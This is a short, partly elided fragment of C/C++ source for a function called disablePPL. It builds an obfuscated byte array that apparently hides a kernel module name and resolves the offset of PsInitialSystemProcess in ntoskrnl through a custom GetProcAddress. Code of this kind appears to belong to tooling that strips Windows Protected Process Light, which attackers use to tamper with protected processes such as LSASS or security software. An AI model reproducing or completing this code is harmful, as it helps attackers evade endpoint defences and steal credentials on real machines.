...
void disablePPL() {
  ...
  const unsigned char nt_enc[] = {0x5E, 0x45, 0x5D, 0x40, 0x5F, 0x47,
                                  0x58, 0x5B, 0x16, 0x5C, 0x19, 0x07};
  ...
  DWORD64 ps_offset =
      (DWORD64)CustomGetProcAddress(hNtoskrnl, ps_str) - (DWORD64)hNtoskrnl;
  // log_info("PsInitialSystemProcess offset: 0x%llx", (unsigned long
  // long)ps_offset);
